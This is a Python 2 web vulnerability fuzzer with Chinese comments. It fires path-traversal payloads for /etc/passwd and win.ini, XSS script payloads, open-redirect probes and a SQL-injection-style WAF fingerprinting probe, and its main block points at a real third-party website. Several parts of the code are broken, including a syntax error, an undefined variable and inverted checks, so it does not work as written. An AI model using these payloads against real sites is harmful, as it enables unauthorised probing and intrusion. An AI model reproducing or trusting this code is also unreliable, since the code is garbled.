#coding=utf-8
import urlparse
import urllib2
import urllib
import re


class fuzzer:
    def __init__(self,url,detect_type,keyword=""):
        self.url = url
        self.detect_type = detect_type
        self.keyword = keyword
    def detect(self):
        #预检测是否存在WAF，如果存在，不进行下一步，直接警告。
        if self.waf_detect():
            return

        global fuzz_list
        global keyword_list
        if self.detect_type == "file_read":
            fuzz_list = [r"../../../../../../../../../../../etc/passwd",r"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",r"../../../../../../../../../../windows/win.ini",r"c:\windows\win.ini","/etc/passwd"]
            keyword_list = [r"root:","[extensions]"]
            log_value = self.file_read_detect()
        elif self.detect_type == "xss_detect":
            result = urlparse.urlparse(self.url)
            params = urlparse.parse_qs(result.query, True)

            fuzz_list = [r"'><Svg/onload=prompt(628)><'",r"'><sCript defer>prompt(628)</SCript><'"]
            keyword_list = [r"prompt\(628"]

            log_value = self.xss_detect(params)
        elif self.detect_type == "url_redirect":
            fuzz_list = [r"@www.baidu.com",r"http://www.baidu.com"]
            keyword_list = [r"bd_logo1"]
            log_value = self.url_redirect_detect()
        elif self.detect_type == "file_download":

           fuzz_list = [r"../../../../../../../../../../../etc/passwd",r"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",r"../../../../../../../../../../windows/win.ini",r"c:\windows\win.ini","/etc/passwd"]
           log_value = self.file_download_detect()
           #http头好像多个stream字段吧,判断是否下载请求。
        elif self.detect_type == "pass_by": 
            log_value = self.pass_by_detect()
        else:
            return
        print log_value
        if log_value != "Error" and log_value != None:
            print "[!]Success exploit here!\n"
        else:
            print "[+]Maybe no vulns here!\n"
            #pass

    def waf_detect(self):
        resp = urllib2.urlopen(self.url+"' and 1=1")
        waf_resp =  ''.join(resp.read())
        X_Safe_Firewall = waf_resp.info().getheader('X-Safe-Firewall')
        Set_Cookie =  waf_resp.info().getheader('Set-Cookie')
        X_Powered_By_360WZB = waf_resp.info().getheader('X-Safe-Firewall')


        if 'safedog' in waf_resp:
            print "[x]Maybe SafeDog here."
            #return "Error"
        elif '360' in X_Safe_Firewall:
            print "[x]Maybe 360 Zhuji Safe here."
        elif '_D_SID' in Set_Cookie:
            print "[x]Maybe D safe here."
        elif '360' in  X_Powered_By_360WZB:
            print "[x]Maybe 360 Wangzhan Safe here."
        elif 'jiasule' in in waf_resp:
            print "[x]Maybe Jiasule Safe here."
        elif  'yunsuo' in waf_resp:
            print "[x]Maybe YunSuo safe here."
        #YunJiaSu is sb,wo zhe li mei zhao dao an li.
        else:
            return False
        return True




    def log_print(self,type,para="None"):
        resp_url = "[!]Vuln url:"+self.url+"\n"
        resp_type = "[!]Vuln type:"+type+"\n"
        resp_para = "[!]Vuln para:"+para+"\n"
        print resp_url+resp_type+resp_para
        f = open("log.txt","a+")
        f.writelines(resp_url+resp_type+resp_para)
        f.close()
        
    def xss_detect(self, params):

        for key in params:    
            if self.keyword != "":
                if self.keyword == key:
                    #params[key] = params[key]+"'><Svg/onload=alert(628)><'"
                    return_value = self.fuzz(params[key][0])
                    if return_value != None  and return_value != "Error":
                        self.log_print("xss_detect", key)
                    return "Success"
                else:
                    return
            else:
                return_value = self.fuzz(params[key][0])
                if return_value != None and return_value != "Error":
                    self.log_print("xss_detect",key)
                    #log_value = "[!]Vuln url:"+self.url+"\n[!]Vuln para:"+key+"\n"
                    return "Success"
                else:
                    pass
        return "Error"
    
    def file_read_detect(self):
        if self.keyword != "":
            return "Error"
        else:
            pass
        file_read_value = self.fuzz(self.keyword)
        if file_read_value != None and file_read_value != "Error":
            self.log_print("file_read_detect",self.keyword)
            return "Success"
        else:
            pass
    def url_redirect_detect(self):
        if self.keyword != "":
            return "Error"
        else:
            pass
        file_read_value = self.fuzz(self.keyword)
        if file_read_value != None and file_read_value != "Error":
            self.log_print("file_read_detect",self.keyword)
            return "Success"
        else:
            pass
    
    #暂时放弃，没有特别好的判断方法，误报率可能会较高。
    #貌似有新的解决办法
    def file_download_detect(self):
        if self.keyword != "":
            return "Error"
        else:
            pass
        file_read_value = self.fuzz(self.keyword)
        if file_read_value != None and file_read_value != "Error":
            self.log_print("file_download_detect",self.keyword)
            return "Success"
        else:
            for item in fuzz_list:
                vector_value = str(value) + str(item)
                #print vector_value
                #print value

                try:
                    detect_url = self.url.replace(value,vector_value)
                    content_type = urllib2.urlopen(detect_url)
                    content_type_string = content_type.info().getheader('content-type')
                    match = re.search('octet-stream',''.join(content_type_string))
                    if match:
                        self.log_print("file_download_detect",self.keyword)
                        return "Success"
                    else:
                        return "Error"
                except Exception,e:
                    print e
                    return "Error"

        
    #此处的关键词，也就是keyword，不能填参数，我们这里要填cookie值，可以复制Set-Cookie里面的内容。
    #坑爹的是，这里抓到的set-cookie好像内容很少，乌云和百度都没抓到，感觉有点鸡肋了。
    #这里只有复制第三方cookie，通过输入框传播。此处通过content-length大小来比较。
    def pass_by_detect(self):
        response = urllib2.urlopen(self.url).read()
        lengh = len(response)
        
        req = urllib2.Request(self.url)
        req.add_header('Cookie', self.keyword)
        cookie_response = urllib2.urlopen(req).read()
        cookie_lengh = len(cookie_response)
        print "cookie_lengh:"+str(cookie_lengh)+"\n"
        print "lengh:"+str(lengh)+"\n"
        if lengh != cookie_lengh:
            self.log_print("pass_by_detect")
            return "Success"
        else:
            return "Error"
        
    def fuzz(self, value=""):
        #fuzz_list = [r"'><Svg/onload=prompt(628)><'",r"'><sCript defer>prompt(628)</SCript><'"]
        #fuzz_list = ['628']
        #if value != "":
        for item in fuzz_list:
            vector_value = str(value) + str(item)
            #print vector_value
            #print value
            detect_url = self.url.replace(value,vector_value)
            try:
                resp = urllib2.urlopen(detect_url).read()
                #match = re.search(r"\n.*628.*\n",resp)
                for keyword in keyword_list:
                    #match = re.search(r"prompt\(628",''.join(resp))
                    match = re.search(keyword,''.join(resp))
                    if match:
                        print "[!]Match success!\n"
                        return "Success"
                    else:
                        pass
            except Exception,e:
                print "[!]Match error:"+str(e)+"\n"
                return "Error"
        return

            
if __name__ == "__main__":
    url = "http://www.tvsou.com/column/index.asp?id=yuQ17S"
    #keyword = "id"
    #fuzzer = fuzzer(url,keyword)
    #fuzzer = fuzzer(url)
    #fuzzer.detect()
            
                
            
        
        
    